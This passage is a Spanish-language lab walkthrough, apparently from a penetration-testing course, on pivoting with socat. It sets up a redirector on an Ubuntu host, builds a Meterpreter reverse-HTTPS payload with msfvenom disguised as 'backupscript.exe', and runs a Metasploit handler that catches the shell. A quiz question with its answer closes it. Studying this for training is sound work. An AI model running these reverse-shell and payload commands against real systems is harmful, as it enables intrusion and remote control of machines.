Socat es una herramienta de retransmisión bidireccional que puede crear conectores entre dos canales de red independientes sin necesidad de usar túneles SSH. Actúa como un redirector que puede escuchar en un host y puerto y reenviar esos datos a otra dirección IP y puerto. 

Podemos iniciar el receptor de Metasploit usando el mismo comando mencionado en la sección anterior en nuestro host de ataque, y podemos iniciar Socat en el servidor Ubuntu.


## Inicializando el listiner Socat

Podemos inicializar el Socat con:

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```


Socat escuchará por el localport en el puerto 8080 y redireccionará todo el tráfico hacia 10.10.14.18:80.
Una vez que hayamos configurado el redirector SOCAT, podemos crear un payload que se conectará a nuestro redirector, que se ejecuta en nuestro servidor Ubuntu.

También iniciaremos un oyente en nuestro host de ataque porque tan pronto como socat reciba una conexión de un objetivo, redirigirá todo el tráfico al oyente de nuestro host de ataque, donde obtendremos un shell.

```shell-session
Polika4RM@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Ejecutamos msfconsole:
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

Y ejecutamos el payload "backupscript.exe" en nuestra máquina pivot UBUNTU.

---

**1. SSH tunneling is required with Socat. True or False?**
False